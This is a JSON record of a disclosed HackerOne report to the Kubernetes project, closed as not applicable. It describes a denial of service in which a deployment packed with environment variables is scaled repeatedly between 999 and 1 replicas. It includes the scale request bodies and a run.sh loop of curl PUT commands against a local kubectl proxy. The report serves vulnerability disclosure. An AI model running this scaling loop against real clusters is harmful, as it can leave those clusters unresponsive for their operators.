{
  "id": 831654,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MzE2NTQ=",
  "url": "https://hackerone.com/reports/831654",
  "title": "\"Self\" DOS with large deployment and scaling",
  "state": "Closed",
  "substate": "not-applicable",
  "severity_rating": "low",
  "readable_substate": "N/A",
  "created_at": "2020-03-25T21:39:21.174Z",
  "submitted_at": "2020-03-25T21:39:21.174Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "wiardvanrij",
    "url": "/wiardvanrij",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/211/498/5839e5b2ceda3f8988eef8d4378fb9cb81f0e97a_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 39386,
    "url": "https://hackerone.com/kubernetes",
    "handle": "kubernetes",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Kubernetes",
      "twitter_handle": "kubernetesio",
      "website": "https://kubernetes.io/",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-07-23T21:42:53.392Z",
  "bug_reporter_agreed_on_going_public_at": "2020-07-23T21:42:53.348Z",
  "team_member_agreed_on_going_public_at": "2020-07-23T17:42:02.550Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Report Submission Form\n\n## Summary:\nGood day! \nI was just messing around with some functions and trying to see what the impact was on my cluster. I found out that it took quite some resources to process a larger deployment, especially when scaling it. \nWhen I check your security release process I noticed that it did include \"Authenticated User\" - DOS (https://github.com/kubernetes/security/blob/master/security-release-process.md#denial-of-service) so I figured I should just make a report of this.\n\nThe summary is: \n\nWhen you define a deployment that contains loads of env variables, we can easily increase the size of what is being processed. When we start to scale & downscale this deployment, we get a massive increase in the API/ETCD memory & CPU usage. \n\nIn my case, I literally ruined my cluster that consists of 3 master nodes (4 vCPUs, 15 GB memory each)\n\n## Kubernetes Version:\n1.15.10\n\n## Component Version:\n\n## Steps To Reproduce:\n\nShort story:\n\n  1. Create a deployment that is near to the max chars allowed with env vars.\n  1. Scale it to N-number of nodes where N could be \"whatever\" - I've tested it with 99 nodes and 999, both seem to be increasing cluster usage\n  1. Scale it back down to 1\n  1. Repeat for a while.\n\nLong story:\n\n1  Create a deployment\n\nPlease check out my example deployment file here: https://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3\nAs it is really huge.\nIt is good to note that I just used a random image and defined really low cpu/mem limits in order to allow many pods to get created without hitting some cluster/node limit\n\n 2   Save this as `scale.json`\n\n```\n{\n    \"kind\": \"Scale\",\n    \"apiVersion\": \"autoscaling/v1\",\n    \"metadata\": {\n      \"name\": \"nginx\",\n      \"namespace\": \"default\"\n    },\n    \"spec\": {\n      \"replicas\": 999\n    }\n}  \n```\n\n3  And save this as `scaledown.json`\n\n```\n{\n    \"kind\": \"Scale\",\n    \"apiVersion\": \"autoscaling/v1\",\n    \"metadata\": {\n      \"name\": \"nginx\",\n      \"namespace\": \"default\"\n    },\n    \"spec\": {\n      \"replicas\": 1\n    }\n}  \n```\n4 create a `run.sh`\n\n```\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scale.json\ncurl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H \"Content-Type: application/json\" -d @scaledown.json\n... repeat above for a bunch of times (50x or so).\n```\n\n5 I've used kube proxy for easy access\n\nrun `kubectl proxy` to make a proxy to your cluster\n\n6 run the run.sh file\n`./run.sh`  and optionally you could run this multiple times for some \"concurrency\" \n\n7 What you could see\n\nMassive usage in CPU power on the master nodes AND memory usage on for certain the API part of k8s, perhaps the nodes too, but I lost control of everything to see exactly what went down.\nEventually, you should not able to contact your cluster anymore and the nodes remain unresponsive/heavy throttled. \n\n## Notes\n\nThis feels really \"basic\" as for a DOS, though I really wanted to point something out.\nI was actually learning deeper internals of k8s and I just made this \"work\" when I saw some spikes in my metrics. Therefore I wanted to make the note that:\n- I actually made my cluster completely useless with this, but I'm uncertain if the ENV vars and/or the scaling are the sole reason.\n- I've got no idea what is really happening, because even when I stopped my \"script\" - the entire cluster was still unresponsive.\n- I've first tested this locally with KIND, and used KOPS to set up a \"production like\" cluster, and even with 3 somewhat decent master nodes, it was gone in minutes.\n\n\n## Supporting Material/References:\nDeployment file:\nhttps://gist.github.com/wiardvanrij/21e516993603282e174da399002d95a3\n\n## Impact\n\nDOS on the entire k8s cluster.",
  "weakness": {
    "id": 48,
    "name": "Denial of Service"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 1,
  "voters": [
    "wiardvanrij"
  ],
  "severity": {
    "rating": "low",
    "score": 3.7,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "none",
      "availability": "low"
    }
  },
  "structured_scope": {
    "databaseId": 32459,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/kubernetes/kubernetes",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
